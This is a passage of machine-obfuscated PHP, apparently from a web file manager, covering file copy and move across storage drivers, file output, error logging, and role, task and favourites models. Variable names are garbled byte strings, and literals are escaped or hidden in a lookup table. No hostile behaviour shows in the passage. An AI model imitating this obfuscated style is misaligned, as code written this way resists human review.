$¥Ïœ£ï‘, $œº’¾, $ òŠÃŒ», $–½ì®éÚ, $›óŸàÉ¯, $úÎ“¢úº = false, $„èçˆŠ¢ = true) { $ü•Õ‰³ï =& $_SERVER[ˆö¿ÚÌ¼]; $†©Ü½É = empty($úÎ“¢úº) && $úÎ“¢úº !== $ü•Õ‰³ï[231] ? $¥ÔØ€ûª->pathThis($î¡µá‘à) : $úÎ“¢úº; if ($ òŠÃŒ») { $£Íâ•¼š = $¥Ïœ£ï‘->fileNameExist($œº’¾, $†©Ü½É); $ïŠ¹É½ø = $†©Ü½É; $†©Ü½É = $¥Ïœ£ï‘->fileNameAuto($œº’¾, $†©Ü½É, $ òŠÃŒ», !$›óŸàÉ¯); if (!$£Íâ•¼š || $ïŠ¹É½ø != $†©Ü½É) { $ òŠÃŒ» = !1; } if ($„èçˆŠ¢ && !$ òŠÃŒ») { $¥Ïœ£ï‘->_data[$ü•Õ‰³ï[1250]] = !0; } } if ($›óŸàÉ¯) { return self::copyFile($¥ÔØ€ûª, $î¡µá‘à, $¥Ïœ£ï‘, $œº’¾, $†©Ü½É, $–½ì®éÚ); } if ($ òŠÃŒ» == REPEAT_RENAME_FOLDER) { $ òŠÃŒ» = !1; } $¤å½€Ì = rtrim($œº’¾, $ü•Õ‰³ï[8]) . $ü•Õ‰³ï[8] . $†©Ü½É; $üœÍ­õå = $¥Ïœ£ï‘->mkdir($¥Ïœ£ï‘->getPath($¤å½€Ì), $ òŠÃŒ»); $œº’¾ = $¥Ïœ£ï‘->getPathInner($üœÍ­õå); $êåáùÊÖ = $¥ÔØ€ûª->listPath($î¡µá‘à, !0); $êåáùÊÖ = is_array($êåáùÊÖ) ? $êåáùÊÖ : array($ü•Õ‰³ï[86] => array(), $ü•Õ‰³ï[85] => array()); $İìä™ÍÉ = array_merge($êåáùÊÖ[$ü•Õ‰³ï[86]], $êåáùÊÖ[$ü•Õ‰³ï[85]]); foreach ($İìä™ÍÉ as $îÕ°Ê) { $˜¯­àƒ› = $îÕ°Ê[$ü•Õ‰³ï[33]] == $ü•Õ‰³ï[233]; $î¡µá‘à = $¥ÔØ€ûª->getPathInner($îÕ°Ê[$ü•Õ‰³ï[87]]); $½Ì…Ğô = self::copyPath($¥ÔØ€ûª, $î¡µá‘à, $¥Ïœ£ï‘, $œº’¾, $ òŠÃŒ», $–½ì®éÚ, $˜¯­àƒ›, !1, !1); if (!$½Ì…Ğô) { IO::errorTips($ü•Õ‰³ï[1251] . $î¡µá‘à . $ü•Õ‰³ï[73] . $œº’¾); } } self::copyMoveKeepInfo($¥ÔØ€ûª, $î¡µá‘à, $üœÍ­õå); return $üœÍ­õå; } private static function copyFile($ÒĞí£Œ·, $¨à½“ˆö, $Ä£µí®ì, $×öåÒÄÎ, $¶Åõş¹­, $òÚ¾¤ƒî) { $éğı‰ª =& $_SERVER[ˆö¿ÚÌ¼]; $×öåÒÄÎ = $Ä£µí®ì->getPath(rtrim($×öåÒÄÎ, $éğı‰ª[8]) . $éğı‰ª[8] . $¶Åõş¹­); $ï¤¤ë›Á = $éğı‰ª[1252] . time() . rand_string(5); Hook::trigger($éğı‰ª[1253], $ÒĞí£Œ·, $¨à½“ˆö, $Ä£µí®ì, $×öåÒÄÎ, $¶Åõş¹­, $ï¤¤ë›Á); if (self::driverIsSame($ÒĞí£Œ·, $Ä£µí®ì)) { if ($òÚ¾¤ƒî) { $ß†–Ï–½ = $Ä£µí®ì->moveFile($¨à½“ˆö, $×öåÒÄÎ); } else { $ß†–Ï–½ = $Ä£µí®ì->copyFile($¨à½“ˆö, $×öåÒÄÎ); } Hook::trigger($éğı‰ª[1254], $ÒĞí£Œ·, $¨à½“ˆö, $Ä£µí®ì, $×öåÒÄÎ, $¶Åõş¹­, $ß†–Ï–½); self::copyMoveKeepInfo($ÒĞí£Œ·, $¨à½“ˆö, $ß†–Ï–½); return $ß†–Ï–½; } $ğ…¤ƒúÌ = TEMP_FILES; if ($GLOBALS[$éğı‰ª[6]][$éğı‰ª[92]][$éğı‰ª[883]]) { $ğ…¤ƒúÌ = $GLOBALS[$éğı‰ª[6]][$éğı‰ª[92]][$éğı‰ª[883]]; } $–…¿ƒ¨ = $ğ…¤ƒúÌ; mk_dir($–…¿ƒ¨); $×× Ü£® = $–…¿ƒ¨ . $ï¤¤ë›Á; $µ–¨¥Û = $×× Ü£®; $×× Ü£® = $ÒĞí£Œ·->download($¨à½“ˆö, $×× Ü£®); $×× Ü£® = $ÒĞí£Œ·->iconvApp($×× Ü£®); if (substr($×× Ü£®, strlen($ğ…¤ƒúÌ)) == $ğ…¤ƒúÌ) { $òÚ¾¤ƒî = !0; } $ß†–Ï–½ = $Ä£µí®ì->upload($×öåÒÄÎ, $×× Ü£®, $òÚ¾¤ƒî); self::remove($µ–¨¥Û); Hook::trigger($éğı‰ª[1254], $ÒĞí£Œ·, $¨à½“ˆö, $Ä£µí®ì, $×öåÒÄÎ, $¶Åõş¹­, $ß†–Ï–½); self::copyMoveKeepInfo($ÒĞí£Œ·, $¨à½“ˆö, $ß†–Ï–½); return $ß†–Ï–½; } private static function copyMoveKeepInfo($¸ô»‚è, $Ğ¡¢‘á£, $¢ôïàÀº) { if (!$¢ôïàÀº) { return; } $§†Éõğª = $¸ô»‚è->info($Ğ¡¢‘á£); if (!is_array($§†Éõğª)) { return; } IO::setModifyTime($¢ôïàÀº, $§†Éõğª[$_SERVER[ˆö¿ÚÌ¼][88]]); } public static function pathFather($ƒÈˆ‡äú) { $Ì»Ùü = IO::init($ƒÈˆ‡äú); $ÙÚÁıÕß = $Ì»Ùü->pathFather($Ì»Ùü->path); return $Ì»Ùü->getPathOuter($ÙÚÁıÕß); } public static function fileOut($ïëÑëäĞ, $ëÏÂ«¶ú = false, $‰«‹§›¤ = false, $ÖªĞ·ù“ = '') { $õ¿’Ø°¸ = self::driverMake($ïëÑëäĞ); if ($õ¿’Ø°¸->isFileOutServer()) { return $õ¿’Ø°¸->fileOutServer($ïëÑëäĞ, $ëÏÂ«¶ú, $‰«‹§›¤, $ÖªĞ·ù“); } return $õ¿’Ø°¸->fileOut($ïëÑëäĞ, $ëÏÂ«¶ú, $‰«‹§›¤, $ÖªĞ·ù“); } public static function fileOutImage($Äğöì•ş, $‚ò»‹Œ• = 250) { $®ŒóáÁ– = array(250, 600, 1200, 2000, 3000, 5000); for ($ìÑ¸„ŒÈ = 0; $ìÑ¸„ŒÈ < count($®ŒóáÁ–); $ìÑ¸„ŒÈ++) { if ($ìÑ¸„ŒÈ == 0 && $‚ò»‹Œ• <= $®ŒóáÁ–[$ìÑ¸„ŒÈ]) { $‚ò»‹Œ• = $®ŒóáÁ–[$ìÑ¸„ŒÈ]; break; } else { if ($‚ò»‹Œ• > $®ŒóáÁ–[$ìÑ¸„ŒÈ - 1] && $‚ò»‹Œ• <= $®ŒóáÁ–[$ìÑ¸„ŒÈ]) { $‚ò»‹Œ• = $®ŒóáÁ–[$ìÑ¸„ŒÈ]; break; } else { if ($ìÑ¸„ŒÈ == count($®ŒóáÁ–) - 1 && $‚ò»‹Œ• > $®ŒóáÁ–[$ìÑ¸„ŒÈ]) { $‚ò»‹Œ• = $®ŒóáÁ–[$ìÑ¸„ŒÈ]; break; } } } } $‚æ‚™İ÷ = self::driverMake($Äğöì•ş); if ($‚æ‚™İ÷->isFileOutServer()) { return $‚æ‚™İ÷->fileOutImageServer($Äğöì•ş, $‚ò»‹Œ•); } return $‚æ‚™İ÷->fileOutImage($Äğöì•ş, $‚ò»‹Œ•); } private static function driverIsSame($Î—¹ØÍ, $‰ÙˆÏò•) { $ÖÕæÎË¡ =& $_SERVER[ˆö¿ÚÌ¼]; $Â£Ç—§Ô = $Î—¹ØÍ->getType(); $ïçø¿ñİ = $‰ÙˆÏò•->getType(); if ($Â£Ç—§Ô != $ïçø¿ñİ) { return !1; } if ($Â£Ç—§Ô == $ÖÕæÎË¡[842]) { return !0; } if ($Â£Ç—§Ô == $ÖÕæÎË¡[109]) { return !0; } if ($Î—¹ØÍ->pathDriver == $‰ÙˆÏò•->pathDriver) { return !0; } return !1; } public static function copyUpdate($ÆÅñë¨ª, $¤©Ë¸õ) { $íŞşßƒ =& $_SERVER[ˆö¿ÚÌ¼]; if (!IO::exist($ÆÅñë¨ª)) { return !1; } if (!IO::exist($¤©Ë¸õ)) { IO::mkdir($¤©Ë¸õ); } $ó§í«Ã— = array_to_keyvalue(self::listAllSimple($ÆÅñë¨ª), $íŞşßƒ[87]); $‰ıÜ¤®  = array_to_keyvalue(self::listAllSimple($¤©Ë¸õ), $íŞşßƒ[87]); $Ó·­Éõ¡ = array(); $Û÷û­®ƒ = array(); foreach ($ó§í«Ã— as $§’ ¹äÒ => $¨ã‹ù€á) { if (isset($‰ıÜ¤® [$§’ ¹äÒ])) { if ($¨ã‹ù€á[$íŞşßƒ[78]] == 1) { continue; } if ($‰ıÜ¤® [$§’ ¹äÒ][$íŞşßƒ[79]] == $¨ã‹ù€á[$íŞşßƒ[79]]) { continue; } } if ($¨ã‹ù€á[$íŞşßƒ[78]] == 1) { $Û÷û­®ƒ[] = $¤©Ë¸õ . $íŞşßƒ[8] . trim($§’ ¹äÒ, $íŞşßƒ[8]); continue; } $Öì·ìÜ“ = strstr(trim($§’ ¹äÒ, $íŞşßƒ[8]), $íŞşßƒ[8]) ? get_path_father($§’ ¹äÒ) : $íŞşßƒ[12]; $Ó·­Éõ¡[] = array($íŞşßƒ[1255] => $¨ã‹ù€á[$íŞşßƒ[89]], $íŞşßƒ[1256] => rtrim($¤©Ë¸õ, $íŞşßƒ[8]) . $íŞşßƒ[8] . $Öì·ìÜ“, $íŞşßƒ[1257] => $¨ã‹ù€á); } $´È¯×ƒ° = array($íŞşßƒ[233] => $Ó·­Éõ¡, $íŞşßƒ[78] => $Û÷û­®ƒ); Hook::trigger($íŞşßƒ[1258], $ÆÅñë¨ª, $¤©Ë¸õ, $´È¯×ƒ°); foreach ($Û÷û­®ƒ as $¨ã‹ù€á) { IO::mkdir($¨ã‹ù€á); } foreach ($Ó·­Éõ¡ as $¨ã‹ù€á) { IO::copy($¨ã‹ù€á[$íŞşßƒ[1255]], $¨ã‹ù€á[$íŞşßƒ[1256]], REPEAT_REPLACE); } } public static function fileSubstr($¤ªîœˆÖ, $¡ş¼ˆÕó, $óõ¼ÌüŸ = false) { $”ÕöÅÁö =& $_SERVER[ˆö¿ÚÌ¼]; $µ§­À¸´ = self::driverMake($¤ªîœˆÖ); $ÊÓ…„È = $µ§­À¸´->size($¤ªîœˆÖ); $Ææ£ÉŸÚ = $¡ş¼ˆÕó; $À¼…¸Ö» = $óõ¼ÌüŸ; if ($¡ş¼ˆÕó < 0) { $¡ş¼ˆÕó = $ÊÓ…„È + $¡ş¼ˆÕó; } if ($óõ¼ÌüŸ === !1) { $óõ¼ÌüŸ = $ÊÓ…„È - $¡ş¼ˆÕó; } if ($¡ş¼ˆÕó + $óõ¼ÌüŸ > $ÊÓ…„È) { $óõ¼ÌüŸ = $ÊÓ…„È - $¡ş¼ˆÕó; } if (!$ÊÓ…„È && $µ§­À¸´->getType() == $”ÕöÅÁö[109] && !$µ§­À¸´->exist($¤ªîœˆÖ)) { $Ü×·±” = get_path_this($¤ªîœˆÖ); $‰¿öÕ÷¸ = parse_url_query($Ü×·±”); if (is_array($‰¿öÕ÷¸) && isset($‰¿öÕ÷¸[$”ÕöÅÁö[32]])) { $Ü×·±” = urldecode($‰¿öÕ÷¸[$”ÕöÅÁö[32]]); } throw new Exception($”ÕöÅÁö[1259] . LNG($”ÕöÅÁö[1260]) . $”ÕöÅÁö[1057] . clear_html($Ü×·±”) . $”ÕöÅÁö[12]); } if ($óõ¼ÌüŸ <= 0) { return $”ÕöÅÁö[12]; } if ($¡ş¼ˆÕó < 0 || $¡ş¼ˆÕó >= $ÊÓ…„È || $óõ¼ÌüŸ > 1024 * 1024 * 10) { throw new Exception("\146\x69\154\145\122\x65\141\x64\x20\145\x72\x72\157\x72\x21\x20\163\164\141\162\x74\75{$¡ş¼ˆÕó}\73\154\x65\x6e\x67\x74\150\x3d{$óõ¼ÌüŸ}\x3b\x20\x73\x69\172\145\x3d{$ÊÓ…„È}\x3b"); } $ˆìÕ™Ñ­ = $µ§­À¸´->fileSubstr($¤ªîœˆÖ, $¡ş¼ˆÕó, $óõ¼ÌüŸ); if (!$ˆìÕ™Ñ­ && $óõ¼ÌüŸ && isset($GLOBALS[$”ÕöÅÁö[1261]])) { throw new Exception($GLOBALS[$”ÕöÅÁö[1261]][$”ÕöÅÁö[1262]]); } return $ˆìÕ™Ñ­; } private static function driverMake(&$Í¨Ú•úÇ) { $éÀ¶äãü =& $_SERVER[ˆö¿ÚÌ¼]; $æƒŞäÅ = KodIO::parse($Í¨Ú•úÇ); if (!self::$driverListSystem) { $¢´©¥òˆ = Model($éÀ¶äãü[852])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($¢´©¥òˆ, $éÀ¶äãü[478]); } if ($æƒŞäÅ[$éÀ¶äãü[33]] == KodIO::KOD_IO && !self::$driverListSystem[$æƒŞäÅ[$éÀ¶äãü[478]]]) { throw new Exception($éÀ¶äãü[1263]); return !1; } $Í¨Ú•úÇ = $æƒŞäÅ[$éÀ¶äãü[1264]]; $˜»¸øÓ— = self::driverGet($æƒŞäÅ, $Í¨Ú•úÇ); return $˜»¸øÓ—; } private static function driverGet($ßßËÔ÷Ÿ, &$Óğ˜ôğş) { $îïÂ€¢Í =& $_SERVER[ˆö¿ÚÌ¼]; $¼ÑØöÃ = $ßßËÔ÷Ÿ[$îïÂ€¢Í[1265]]; $Äá¥±©ë = $ßßËÔ÷Ÿ[$îïÂ€¢Í[478]]; switch ($ßßËÔ÷Ÿ[$îïÂ€¢Í[33]]) { case KodIO::KOD_IO: $İĞ­†ú = self::$driverListSystem[$Äá¥±©ë]; break; case KodIO::KOD_SOURCE: $Óğ˜ôğş = $Äá¥±©ë . $Óğ˜ôğş; $İĞ­†ú = array($îïÂ€¢Í[1266] => $îïÂ€¢Í[1267], $îïÂ€¢Í[6] => $ßßËÔ÷Ÿ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ğš×ÚÆ = $GLOBALS[$îïÂ€¢Í[1268]]; self::$driverListUser = array_to_keyvalue($ğš×ÚÆ, $îïÂ€¢Í[478]); } $İĞ­†ú = self::$driverListUser[$Äá¥±©ë]; break; case KodIO::KOD_SHARE_LINK: $İĞ­†ú = array($îïÂ€¢Í[1266] => $îïÂ€¢Í[1269], $îïÂ€¢Í[6] => $ßßËÔ÷Ÿ); $ÇÅ®®ó‹ = Action($îïÂ€¢Í[1270])->sharePathInfo($ßßËÔ÷Ÿ[$îïÂ€¢Í[87]]); $Óğ˜ôğş = $ÇÅ®®ó‹[$îïÂ€¢Í[194]]; if (!$ÇÅ®®ó‹[$îïÂ€¢Í[194]]) { $é¼ş¤æ„ = Model($îïÂ€¢Í[681])->getInfo($ÇÅ®®ó‹[$îïÂ€¢Í[682]]); $Óğ˜ôğş = KodIO::clear($é¼ş¤æ„[$îïÂ€¢Í[1271]] . $ßßËÔ÷Ÿ[$îïÂ€¢Í[1264]]); $ßßËÔ÷Ÿ[$îïÂ€¢Í[574]] = $é¼ş¤æ„; $ßßËÔ÷Ÿ[$îïÂ€¢Í[1246]] = $Óğ˜ôğş; $İĞ­†ú = array($îïÂ€¢Í[1266] => $îïÂ€¢Í[1272], $îïÂ€¢Í[6] => $ßßËÔ÷Ÿ); } break; case KodIO::KOD_SHARE_ITEM: $İĞ­†ú = array($îïÂ€¢Í[1266] => $îïÂ€¢Í[1273], $îïÂ€¢Í[6] => $ßßËÔ÷Ÿ); $é¼ş¤æ„ = Model($îïÂ€¢Í[681])->getInfo($ßßËÔ÷Ÿ[$îïÂ€¢Í[478]]); if ($é¼ş¤æ„[$îïÂ€¢Í[194]] == $îïÂ€¢Í[231]) { $Óğ˜ôğş = KodIO::clear($é¼ş¤æ„[$îïÂ€¢Í[1271]] . $ßßËÔ÷Ÿ[$îïÂ€¢Í[1264]]); $ßßËÔ÷Ÿ[$îïÂ€¢Í[574]] = $é¼ş¤æ„; $ßßËÔ÷Ÿ[$îïÂ€¢Í[1246]] = $Óğ˜ôğş; $İĞ­†ú = array($îïÂ€¢Í[1266] => $îïÂ€¢Í[1274], $îïÂ€¢Í[6] => $ßßËÔ÷Ÿ); } else { if (!$Óğ˜ôğş) { $Óğ˜ôğş = $é¼ş¤æ„[$îïÂ€¢Í[194]]; } } break; default: $Óğ˜ôğş = $ßßËÔ÷Ÿ[$îïÂ€¢Í[87]]; $İĞ­†ú = array($îïÂ€¢Í[1266] => $îïÂ€¢Í[1275]); break; } $ÈîÈ·úÙ = $ßßËÔ÷Ÿ[$îïÂ€¢Í[87]]; if (!isset(self::$driverCache[$ÈîÈ·úÙ])) { $€ß¿ˆœš = strtolower($İĞ­†ú[$îïÂ€¢Í[98]]); $óœíÈ»Å = $GLOBALS[$îïÂ€¢Í[6]][$îïÂ€¢Í[92]][$îïÂ€¢Í[916]]; $¶‡Éçß¯ = $îïÂ€¢Í[77] . (isset($óœíÈ»Å[$€ß¿ˆœš]) ? $óœíÈ»Å[$€ß¿ˆœš] : ucfirst($€ß¿ˆœš)); if (!class_exists($¶‡Éçß¯)) { show_json("{$¶‡Éçß¯}\x20\156\157\164\40\x65\x78\x69\163\164\163\x21", !1); } $­®……™Í = isset($İĞ­†ú[$îïÂ€¢Í[6]]) ? $İĞ­†ú[$îïÂ€¢Í[6]] : !1; self::$driverCache[$ÈîÈ·úÙ] = new $¶‡Éçß¯($­®……™Í); } $¬è’Ò”¢ = self::$driverCache[$ÈîÈ·úÙ]; $¬è’Ò”¢->pathDriver = $¼ÑØöÃ; $¬è’Ò”¢->pathBase = $îïÂ€¢Í[12]; if (isset($İĞ­†ú[$îïÂ€¢Í[6]][$îïÂ€¢Í[1276]])) { $¬è’Ò”¢->pathBase = rtrim($İĞ­†ú[$îïÂ€¢Í[6]][$îïÂ€¢Í[1276]], $îïÂ€¢Í[8]) . $îïÂ€¢Í[8]; $Óğ˜ôğş = $¬è’Ò”¢->pathBase . ltrim($Óğ˜ôğş, $îïÂ€¢Í[8]); } $Óğ˜ôğş = $¬è’Ò”¢->getPath($Óğ˜ôğş); if (isset($ßßËÔ÷Ÿ[$îïÂ€¢Í[1246]])) { $Óğ˜ôğş = $ßßËÔ÷Ÿ[$îïÂ€¢Í[1246]]; } $¬è’Ò”¢->path = $Óğ˜ôğş; return $¬è’Ò”¢; } public static function errorTips($Ìš–Óıì = false) { $ËÖëÍÙÔ =& $_SERVER[ˆö¿ÚÌ¼]; static $§Ñº¦ = array(); $”ÀüÆ·û = 1000; if ($Ìš–Óıì === -1) { return $§Ñº¦ ? $§Ñº¦[count($§Ñº¦) - 1] : $ËÖëÍÙÔ[12]; } if ($Ìš–Óıì === !1) { return implode($ËÖëÍÙÔ[288], $§Ñº¦); } if (count($§Ñº¦) >= $”ÀüÆ·û) { $§Ñº¦ = array_slice($§Ñº¦, $”ÀüÆ·û * 0.5, $”ÀüÆ·û); } $§Ñº¦[] = $Ìš–Óıì; write_log($ËÖëÍÙÔ[176] . ACTION . $ËÖëÍÙÔ[1277] . $Ìš–Óıì, $ËÖëÍÙÔ[1278]); } public static function getLastError($ş÷¬æ­ = '') { $›Ø±¹¶ = self::errorTips(-1); return $›Ø±¹¶ ? $›Ø±¹¶ : $ş÷¬æ­; } } goto BãÃ³»ÕÆ; EñÍ­ãŠ: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\x2e\x72\x6f\x6c\x65\114\x69\163\x74"; public $field = array("\x6e\141\155\145", "\141\x75\164\150", "\x6c\x61\x62\145\x6c", "\144\151\x73\160\x6c\141\171", "\163\171\x73\x74\145\x6d", "\144\x65\163\143", "\x69\x67\x6e\157\x72\145\105\170\x74", "\x69\x67\x6e\x6f\162\145\106\151\x6c\x65\x53\151\x7a\145", "\141\144\155\151\156\x69\x73\x74\162\x61\164\157\x72", "\163\x6f\162\164"); public function listData($íºëÄŸ„ = false, $™ã‹„°ó = "\163\x6f\x72\164", $¬ù´ï› = false) { $íøãˆ÷Ø =& $_SERVER[ˆö¿ÚÌ¼]; $ö‘¨¦àù = parent::listData($íºëÄŸ„, $™ã‹„°ó, $¬ù´ï›); if (!$íºëÄŸ„) { foreach ($ö‘¨¦àù as $›àøó›  => $Œú •ÌÍ) { if ($Œú •ÌÍ[$íøãˆ÷Ø[2197]] == 1) { $ö‘¨¦àù[$›àøó› ][$íøãˆ÷Ø[538]] = LNG($íøãˆ÷Ø[2472]); } } } return $ö‘¨¦àù; } public function update($€€¡¨ùŒ, $Ï‰õŸ–œ) { $ıóˆü ù =& $_SERVER[ˆö¿ÚÌ¼]; $Ã’„ş° = parent::listData($€€¡¨ùŒ); $—Œé­¨ = $this->findByName($Ï‰õŸ–œ[$ıóˆü ù[32]]); if (!$Ã’„ş° || $—Œé­¨ && $—Œé­¨[$ıóˆü ù[478]] != $Ã’„ş°[$ıóˆü ù[478]]) { return !1; } if ($—Œé­¨[$ıóˆü ù[2197]] == 1) { $Ï‰õŸ–œ = array($ıóˆü ù[32] => $Ï‰õŸ–œ[$ıóˆü ù[32]], $ıóˆü ù[2009] => $Ï‰õŸ–œ[$ıóˆü ù[2009]]); } $this->filterAuth($Ï‰õŸ–œ[$ıóˆü ù[499]]); return parent::update($€€¡¨ùŒ, $Ï‰õŸ–œ); } public function remove($©Éı—»º) { $å®¨ÍÉÒ = parent::listData($©Éı—»º); if (!$å®¨ÍÉÒ || $å®¨ÍÉÒ[$_SERVER[ˆö¿ÚÌ¼][192]]) { return !1; } return parent::remove($©Éı—»º); } public function add($Î¬¥áó„) { $ëê×àµ® =& $_SERVER[ˆö¿ÚÌ¼]; $‚ÔÍ‹Í‹ = $Î¬¥áó„[$ëê×àµ®[32]]; if ($this->findByName($‚ÔÍ‹Í‹)) { return !1; } $ãÊŒ›  = array($ëê×àµ®[506] => $‚ÔÍ‹Í‹, $ëê×àµ®[1992] => $ëê×àµ®[12], $ëê×àµ®[1988] => $ëê×àµ®[1996], $ëê×àµ®[2473] => 1, $ëê×àµ®[1991] => 0, $ëê×àµ®[2474] => 0, $ëê×àµ®[1990] => $this->getSort()); $Î¬¥áó„ = array_merge($ãÊŒ› , $Î¬¥áó„); $this->filterAuth($Î¬¥áó„[$ëê×àµ®[499]]); return parent::insert($Î¬¥áó„); } private function getSort() { $ï¾şå¤ =& $_SERVER[ˆö¿ÚÌ¼]; $—àËş¾• = parent::listData(); $õ×±× = array_to_keyvalue($—àËş¾•, $ï¾şå¤[12], $ï¾şå¤[2010]); return empty($õ×±×) ? 0 : max($õ×±×) + 1; } private function filterAuth(&$ŠÑ²Â×) { $ä‰ËÊ°• =& $_SERVER[ˆö¿ÚÌ¼]; $öôëù¿„ = array(); $éøæü‹µ = array_filter(explode($ä‰ËÊ°•[50], $ŠÑ²Â×)); foreach ($éøæü‹µ as $ŠÑ²Â×) { $´ÜŞ¢ã = explode($ä‰ËÊ°•[10], $ŠÑ²Â×); if ($´ÜŞ¢ã[0] == $ä‰ËÊ°•[2475] && $´ÜŞ¢ã[1] != $ä‰ËÊ°•[1289]) { $Á‚¥ã ¶ = $´ÜŞ¢ã[0] . $ä‰ËÊ°•[10] . $´ÜŞ¢ã[1] . $ä‰ËÊ°•[2476]; if (!in_array($Á‚¥ã ¶, $éøæü‹µ)) { $öôëù¿„[] = $Á‚¥ã ¶; } } $öôëù¿„[] = $ŠÑ²Â×; } $ŠÑ²Â× = implode($ä‰ËÊ°•[50], $öôëù¿„); } public function findRoleDefault() { $ıé˜Îº =& $_SERVER[ˆö¿ÚÌ¼]; $½¬°  Û = parent::listData(); $ŞûÑóÁ = !1; foreach ($½¬°  Û as $êİ¿õí) { if (!$êİ¿õí || $êİ¿õí[$ıé˜Îº[2008]] == $ıé˜Îº[231] || $êİ¿õí[$ıé˜Îº[2197]] == 1) { continue; } if (strstr($êİ¿õí[$ıé˜Îº[499]], $ıé˜Îº[2477])) { continue; } if (!strstr($êİ¿õí[$ıé˜Îº[499]], $ıé˜Îº[2478])) { continue; } if (!$ŞûÑóÁ) { $ŞûÑóÁ = $êİ¿õí; continue; } $ğ‰ ÷Ï± = explode($ıé˜Îº[50], $ŞûÑóÁ[$ıé˜Îº[499]]); $²Öİü = explode($ıé˜Îº[50], $êİ¿õí[$ıé˜Îº[499]]); if (count($ğ‰ ÷Ï±) > count($²Öİü)) { $ŞûÑóÁ = $êİ¿õí; } } return $ŞûÑóÁ ? $ŞûÑóÁ[$ıé˜Îº[478]] : $ıé˜Îº[12]; } public function sort($ÁáúÄù, $Ğñ†€®) { return parent::update($ÁáúÄù, $Ğñ†€®); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\x2e\x74\141\163\x6b\114\x69\x73\164"; public $field = array("\156\x61\155\145", "\164\171\x70\x65", "\x65\166\145\x6e\164", "\164\151\155\145", "\x64\145\163\x63", "\163\171\x73\164\x65\x6d", "\x65\x6e\141\x62\x6c\145", "\154\x61\x73\164\x52\x75\156", "\x73\157\162\164"); public function listData($Ä¢¹ÂÃÁ = false, $êÃ‰Ğ¶¡ = "\163\x6f\162\164", $œºèÂïÇ = false) { return parent::listData($Ä¢¹ÂÃÁ, $êÃ‰Ğ¶¡, $œºèÂïÇ); } public function add($ĞûóÆ») { $Üçôˆî÷ =& $_SERVER[ˆö¿ÚÌ¼]; $½Ì²Ï†î = $this->findByName($ĞûóÆ»[$Üçôˆî÷[32]]); if ($½Ì²Ï†î) { return !1; } $ĞûóÆ»[$Üçôˆî÷[1735]] = 0; $ĞûóÆ»[$Üçôˆî÷[2010]] = $this->getSort(); return parent::insert($ĞûóÆ»); } private function getSort() { $Ô¸‡âÀ‡ =& $_SERVER[ˆö¿ÚÌ¼]; $ŠÙÄíôè = parent::listData(); $ğïÑŸ¸‚ = array_to_keyvalue($ŠÙÄíôè, $Ô¸‡âÀ‡[12], $Ô¸‡âÀ‡[2010]); return empty($ğïÑŸ¸‚) ? 0 : max($ğïÑŸ¸‚) + 1; } public function update($Ï½œ¸ç, $’€”´©‡) { $Ù€‰¨Ô =& $_SERVER[ˆö¿ÚÌ¼]; $‚ß‚Ú§ı = $this->listData($Ï½œ¸ç); $ËÖ´‘”œ = $this->findByName($’€”´©‡[$Ù€‰¨Ô[32]]); if (!$‚ß‚Ú§ı || $ËÖ´‘”œ && $ËÖ´‘”œ[$Ù€‰¨Ô[478]] != $‚ß‚Ú§ı[$Ù€‰¨Ô[478]]) { return !1; } return parent::update($Ï½œ¸ç, $’€”´©‡); } public function remove($Ó±Ùúë’, $ºØÊäú = false) { $À¡½èüì =& $_SERVER[ˆö¿ÚÌ¼]; $êÖ„½åı = $this->listData($Ó±Ùúë’); if (!$êÖ„½åı) { return; } if (!$ºØÊäú && $êÖ„½åı[$À¡½èüì[192]] == $À¡½èüì[91]) { return !1; } return parent::remove($Ó±Ùúë’); } public function enable($äõæÙ’, $¤ĞšÒÊû) { return $this->update($äõæÙ’, array($_SERVER[ˆö¿ÚÌ¼][2467] => $¤ĞšÒÊû)); } public function run($Êª©ƒø·) { return $this->update($Êª©ƒø·, array($_SERVER[ˆö¿ÚÌ¼][2479] => time())); } } goto B„õéˆİ‡¶; B„õéˆİ‡¶: class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\162\x5f\146\141\166"; protected function cacheFunctionAlias($±Ó¸Ğƒ) { $öú©ñ³™ =& $_SERVER[ˆö¿ÚÌ¼]; return array($öú©ñ³™[2101] => array(USER_ID, $öú©ñ³™[2480])); } protected function listData() { $É½Á½¢‹ =& $_SERVER[ˆö¿ÚÌ¼]; $«§…öâ = array($É½Á½¢‹[1776] => USER_ID, $É½Á½¢‹[571] => 0); $ÂóÀù« = $É½Á½¢‹[2481]; $˜ˆşÀİ´ = $this->field($ÂóÀù«)->where($«§…öâ)->order($É½Á½¢‹[2482])->select(); return $˜ˆşÀİ´ ? $˜ˆşÀİ´ : array(); } protected function resetCache() { } protected function listView() { $™ ıÆÆ =& $_SERVER[ˆö¿ÚÌ¼]; $Â‡İŒÑ‡ = $this->listData(); $™ñæñ£Ú = array_filter_by_field($Â‡İŒÑ‡, $™ ıÆÆ[33], $™ ıÆÆ[502]); $·à‰¼õŞ = array_to_keyvalue($™ñæñ£Ú, $™ ıÆÆ[12], $™ ıÆÆ[87]); if (!$·à‰¼õŞ) { return $Â‡İŒÑ‡; } $»ğ‹¢‹ = 2000; $ËŠÛêµ¤ = array($™ ıÆÆ[503] => array($™ ıÆÆ[504], $·à‰¼õŞ)); $Ìì«ÑÈ£ = Model($™ ıÆÆ[915])->listSource($ËŠÛêµ¤, $»ğ‹¢‹); $Ìì«ÑÈ£ = array_merge($Ìì«ÑÈ£[$™ ıÆÆ[86]], $Ìì«ÑÈ£[$™ ıÆÆ[85]]); $Ìì«ÑÈ£ = array_to_keyvalue($Ìì«ÑÈ£, $™ ıÆÆ[194]); foreach ($Â‡İŒÑ‡ as $ŠÚøéß¡ => $ „ºşö¢) { $ë¿’úç½ = $Ìì«ÑÈ£[$ „ºşö¢[$™ ıÆÆ[87]]]; $ë¿’úç½ = $ë¿’úç½ ? $ë¿’úç½ : array(); $Â‡İŒÑ‡[$ŠÚøéß¡] = array_merge($ë¿’úç½, $ „ºşö¢); } return $Â‡İŒÑ‡; } protected function addFav($ÚÍ¼ú×Ü, $œ×İôÊ¶ = '', $Ïğ­Ş² = "\163\157\x75\x72\143\x65") { $’ã¹¥ù =& $_SERVER[ˆö¿ÚÌ¼]; $·ÙıµÇÎ = array($’ã¹¥ù[1776] => 